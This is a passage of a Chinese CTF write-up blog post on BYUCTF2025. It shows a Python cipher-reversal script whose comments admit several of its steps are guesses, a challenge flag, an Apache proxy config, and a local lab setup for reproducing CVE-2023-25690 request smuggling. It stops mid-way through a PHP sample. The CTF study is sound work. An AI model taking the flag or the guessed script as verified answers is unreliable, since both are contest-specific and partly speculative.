<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>BYUCTF2025</title><link rel=canonical href=https://baozongwi.xyz/p/byuctf2025/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="BYUCTF2025"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.xyz/p/byuctf2025/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='xss'><meta property='article:tag' content='jail'><meta property='article:tag' content='jwt'><meta property='article:tag' content='日志分析'><meta property='article:published_time' content='2025-05-17T10:02:30+00:00'><meta property='article:modified_time' content='2025-05-17T10:02:30+00:00'><meta name=twitter:title content="BYUCTF2025"><meta name=twitter:description content="刷"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#anaken21sec1>Anaken21sec1</a></li><li><a href=#pem>PEM</a></li><li><a href=#willy-wonka-web>Willy Wonka Web</a></li><li><a href=#red-this>Red This</a></li><li><a href=#cooking-flask>Cooking Flask</a></li><li><a href=#jwtf>JWTF</a></li><li><a href=#wembsoncket>Wembsoncket</a></li><li><a href=#are-you-looking-me-up>Are You Looking Me Up?</a></li><li><a href=#mine-over-matter>Mine Over Matter</a></li><li><a href=#enabled>Enabled</a></li><li><a href=#小结>小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/byuctf2025/>BYUCTF2025</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-05-17T10:02:30Z>May 17, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>17 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 270 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=anaken21sec1>Anaken21sec1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>ceil</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=s2>&#34;cnpiaytjyzggnnnktjzcvuzjexxkvnrlfzectovhfswyphjt&#34;</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;orygwktcjpb&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. 生成 keyNums 序列</span>
</span></span><span class=line><span class=cl><span class=n>keyNums</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>-</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>key</span><span class=p>]</span>  <span class=c1># 将密钥字符映射为 0-25 的数</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 逆列换位：按行构造网格，重排列</span>
</span></span><span class=line><span class=cl><span class=n>rows</span> <span class=o>=</span> <span class=n>ceil</span><span class=p>(</span><span class=n>L</span> <span class=o>/</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 初始化网格（可能有空缺）</span>
</span></span><span class=line><span class=cl><span class=n>grid</span> <span class=o>=</span> <span class=p>[[</span><span class=s1>&#39;&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=n>n</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>rows</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>rows</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>idx</span> <span class=o>&lt;</span> <span class=n>L</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>grid</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 计算列排序：根据 key 字母的字母序确定新列位置</span>
</span></span><span class=line><span class=cl><span class=n>sorted_cols</span> <span class=o>=</span> <span class=nb>sorted</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>i</span><span class=p>:</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 创建原始位置的空网格</span>
</span></span><span class=line><span class=cl><span class=n>orig_grid</span> <span class=o>=</span> <span class=p>[[</span><span class=s1>&#39;&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=n>n</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>rows</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=c1># 恢复列顺序：sorted_cols[j] 列是原始列 j</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>new_c</span><span class=p>,</span> <span class=n>old_c</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>sorted_cols</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>rows</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>orig_grid</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>old_c</span><span class=p>]</span> <span class=o>=</span> <span class=n>grid</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>new_c</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 从恢复列换位后的网格读取中间密文</span>
</span></span><span class=line><span class=cl><span class=n>mid_cipher</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>row</span><span class=p>)</span> <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>orig_grid</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 分块并逐块逆向变换</span>
</span></span><span class=line><span class=cl><span class=n>blocks</span> <span class=o>=</span> <span class=p>[</span><span class=n>mid_cipher</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>12</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>mid_cipher</span><span class=p>),</span> <span class=mi>12</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>plaintext</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>blk</span> <span class=ow>in</span> <span class=n>blocks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 将字符转矩阵（此处举例按行填充到6x6，其余设为 None）</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span> <span class=o>=</span> <span class=p>[[</span><span class=kc>None</span><span class=p>]</span><span class=o>*</span><span class=mi>6</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=c1># 将 blk 的字符填入 M，例如按行前12个位置（具体映射规则以加密为准）</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>idx</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>blk</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span> <span class=o>=</span> <span class=n>blk</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=c1># 对 M 执行 5 轮逆向操作：每轮先逆向加法再逆向置换</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nb>round</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=n>keyNums</span><span class=p>[</span><span class=nb>round</span><span class=p>]</span> <span class=o>%</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>        <span class=c1># 逆向加法：对 M 中每个元素做减法（具体减到的数字要模回字母表或方阵大小）</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=c1># 示例：假设 M[r][c] 为字母，先映射到 0-25，加了 k 后取模，现在减去 k</span>
</span></span><span class=line><span class=cl>                    <span class=n>val</span> <span class=o>=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>])</span> <span class=o>-</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>val</span> <span class=o>=</span> <span class=p>(</span><span class=n>val</span> <span class=o>-</span> <span class=n>k</span><span class=p>)</span> <span class=o>%</span> <span class=mi>26</span>
</span></span><span class=line><span class=cl>                    <span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>val</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># 逆向置换：对矩阵 M 进行对应的逆置换操作（例如逆时针旋转等）</span>
</span></span><span class=line><span class=cl>        <span class=c1># 下面示意为逆时针 90°，具体操作需对应加密用的矩阵</span>
</span></span><span class=line><span class=cl>        <span class=n>M</span> <span class=o>=</span> <span class=p>[</span><span class=nb>list</span><span class=p>(</span><span class=n>row</span><span class=p>)</span> <span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=n>M</span><span class=p>)][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>  <span class=c1># 逆时针旋转示例</span>
</span></span><span class=line><span class=cl>    <span class=c1># 从矩阵 M 提取明文（取按加密时相同的填充方式读取字符）</span>
</span></span><span class=line><span class=cl>    <span class=c1># 这里假设只读最初填的那12个位置</span>
</span></span><span class=line><span class=cl>    <span class=n>plain_blk</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>count</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>count</span> <span class=o>&lt;</span> <span class=mi>12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>plain_blk</span> <span class=o>+=</span> <span class=n>M</span><span class=p>[</span><span class=n>r</span><span class=p>][</span><span class=n>c</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>count</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>plaintext</span> <span class=o>+=</span> <span class=n>plain_blk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Recovered plaintext:&#34;</span><span class=p>,</span> <span class=n>plaintext</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 4. 提取 flag：最终得到的 plaintext 应包含 flag 格式，比如 &#34;byuctf{...}&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pem>PEM</h2><p><code>byuctf{P3M_f0rm4t_1s_k1ng}</code></p><h2 id=willy-wonka-web>Willy Wonka Web</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>LoadModule rewrite_module modules/mod_rewrite.so
</span></span><span class=line><span class=cl>LoadModule proxy_module modules/mod_proxy.so
</span></span><span class=line><span class=cl>LoadModule proxy_http_module modules/mod_proxy_http.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;VirtualHost *:80&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ServerName localhost
</span></span><span class=line><span class=cl>    DocumentRoot /usr/local/apache2/htdocs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    RewriteEngine on
</span></span><span class=line><span class=cl>    RewriteRule &#34;^/name/(.*)&#34; &#34;http://backend:3000/?name=$1&#34; [P]
</span></span><span class=line><span class=cl>    ProxyPassReverse &#34;/name/&#34; &#34;http://backend:3000/&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    RequestHeader unset A
</span></span><span class=line><span class=cl>    RequestHeader unset a
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
</span></span></code></pre></td></tr></table></div></div><p>去掉了<code>A</code>和<code>a</code>，同时写了一个反代，当我们传参<code>/name/test</code>的时候就相当于<code>http://backend:3000/?name=test</code>，无从下手，后面搜索绕过<code>unset</code>，可以搜出来请求走私，发现<strong>CVE-2023-25690</strong>，但是我怎么打都没有成功，我本地复现一下这个CVE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git clone https://github.com/dhmosfunk/CVE-2023-25690-POC.git
</span></span><span class=line><span class=cl>cd CVE-2023-25690-POC/lab
</span></span><span class=line><span class=cl>docker compose up -d
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;You category ID is: &#39;</span> <span class=o>.</span> <span class=nv>$id</span><span class=p>;</span>
